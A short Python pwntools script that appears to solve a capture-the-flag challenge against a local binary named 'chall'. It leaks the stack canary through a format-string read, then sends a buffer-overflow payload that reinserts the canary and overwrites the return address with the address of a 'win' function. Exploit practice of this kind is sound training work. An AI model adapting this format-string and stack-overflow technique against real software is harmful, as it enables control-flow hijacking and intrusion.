import pwn
import sys

elf = pwn.ELF('./chall')
io = elf.process()
print(io.recv(100000).decode("utf-8"))
io.sendline("%31$016llx")
canary = str(io.recvline().decode("utf-8")).split(" ")
canary = canary[1].split(".")
canary = canary[0]
print(canary)
print(io.recv(100).decode("utf-8"))
new_eip = pwn.p32(elf.symbols["win"])
zeros = int("0000",16)
zeros = pwn.p32(zeros)

canary1 = input()
canary1 = int(canary1 , 16)
canary1 = pwn.p32(canary1)
canary2 = input()
canary2 = int(canary2 , 16)
canary2 = pwn.p32(canary2)

payload = b"".join(
    [
        b"0" * 24,
        canary2,
        canary1,
        b"A" * 8,
        new_eip,
        zeros
    ]
)
io.sendline(payload)
print(io.recv(1000000).decode("utf-8"))
print(io.recv(1000000).decode("utf-8"))